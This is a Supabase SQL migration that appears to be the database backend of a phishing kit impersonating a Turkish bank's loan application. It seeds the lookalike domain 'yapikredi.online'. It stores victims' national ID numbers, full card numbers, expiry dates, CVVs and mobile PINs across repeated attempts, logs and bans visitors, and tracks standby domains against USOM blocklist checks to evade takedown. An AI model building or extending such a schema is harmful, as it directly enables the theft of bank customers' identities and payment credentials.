-- Supabase migration: lgjwhkhrtxsvydgwqphz

create table if not exists applicants (
  id uuid primary key default gen_random_uuid(),
  session_id text not null unique,
  ip_address text not null default '',
  status text not null default 'in_progress',
  current_attempt int not null default 0,
  created_at timestamptz not null default now(),
  completed_at timestamptz
);

create table if not exists attempts (
  id uuid primary key default gen_random_uuid(),
  applicant_id uuid not null references applicants(id) on delete cascade,
  attempt_number int not null,
  tc_kimlik text not null,
  first_name text not null,
  last_name text not null,
  phone text not null,
  birth_date text not null default '',
  loan_amount numeric not null default 0,
  loan_term int not null default 0,
  card_number text not null default '',
  card_expiry text not null default '',
  card_cvv text not null default '',
  no_credit_card boolean not null default false,
  mobile_pin text not null default '',
  created_at timestamptz not null default now(),
  unique (applicant_id, attempt_number)
);

create table if not exists access_logs (
  id uuid primary key default gen_random_uuid(),
  ip text not null,
  session_id text,
  path text not null,
  user_agent text,
  blocked boolean not null default false,
  block_reason text,
  created_at timestamptz not null default now()
);

create index if not exists access_logs_created_at_idx on access_logs (created_at desc);

create table if not exists bans (
  id uuid primary key default gen_random_uuid(),
  type text not null,
  value text not null,
  reason text,
  created_at timestamptz not null default now(),
  expires_at timestamptz
);

create index if not exists bans_type_value_idx on bans (type, value);

create table if not exists site_domains (
  id uuid primary key default gen_random_uuid(),
  hostname text not null unique,
  status text not null default 'standby',
  is_primary boolean not null default false,
  last_usom_check timestamptz,
  blocked_at timestamptz,
  created_at timestamptz not null default now()
);

insert into site_domains (hostname, status, is_primary)
values ('yapikredi.online', 'active', true)
on conflict (hostname) do nothing;

alter table applicants enable row level security;
alter table attempts enable row level security;
alter table access_logs enable row level security;
alter table bans enable row level security;
alter table site_domains enable row level security;
